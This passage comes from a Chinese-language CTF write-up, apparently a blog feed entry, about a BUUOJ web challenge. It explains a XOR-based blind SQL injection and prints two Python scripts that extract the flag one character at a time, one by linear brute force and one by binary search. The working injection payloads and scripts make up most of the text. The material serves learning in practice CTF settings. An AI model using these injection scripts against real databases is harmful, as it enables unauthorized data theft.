<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1^1<span class="o">=</span>0  1^2<span class="o">=</span>1
</code></pre></div></div>

<p>所以我们可以通过输入<code class="language-plaintext highlighter-rouge">1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1</code>，不断改变x的值，根据回显逐渐爆破出flag的值。因为本萌新还不会写脚本，所以用了一下赵师傅的脚本</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://web43.buuoj.cn/index.php</span><span class="sh">"</span>

<span class="n">result</span> <span class="o">=</span> <span class="sh">''</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">1^(cot(ascii(substr((select(flag)from(flag)),</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">,1))&gt;</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="sh">'</span><span class="s">))^1=1</span><span class="sh">'</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>

        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">girl</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
            <span class="k">break</span>

<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre></div></div>

<p>跑了一下不知道哪里错了，但是还是很有学习价值。在网上找了另一个大佬的脚本，用二分法成功跑出了flag</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://d5d88314-27e4-43cf-a7b4-802508698555.node3.buuoj.cn/index.php</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
	<span class="sh">"</span><span class="s">id</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">""</span>
<span class="p">}</span>
<span class="n">result</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
	<span class="n">l</span> <span class="o">=</span> <span class="mi">33</span>
	<span class="n">r</span> <span class="o">=</span><span class="mi">130</span>
	<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">1</span>
	<span class="nf">while</span><span class="p">(</span><span class="n">l</span><span class="o">&lt;</span><span class="n">r</span><span class="p">):</span>
		<span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0^</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
		<span class="n">html</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
		<span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
		<span class="k">if</span> <span class="sh">"</span><span class="s">Hello</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">html</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
			<span class="n">l</span> <span class="o">=</span> <span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">r</span> <span class="o">=</span> <span class="n">mid</span>
		<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">1</span>
	<span class="nf">if</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="o">==</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">):</span>
		<span class="k">break</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">flag: </span><span class="sh">"</span> <span class="p">,</span><span class="n">result</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;ctf&quot;]" /><category term="sqli" /><category term="web" /><category term="ctf" /><summary type="html"><![CDATA[0x01 题目描述]]></summary></entry></feed>